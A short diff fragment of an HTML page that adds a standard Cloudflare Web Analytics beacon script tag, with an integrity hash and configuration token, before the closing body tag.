+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"6f5c9a37ded84471b8ea729294a1195d","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
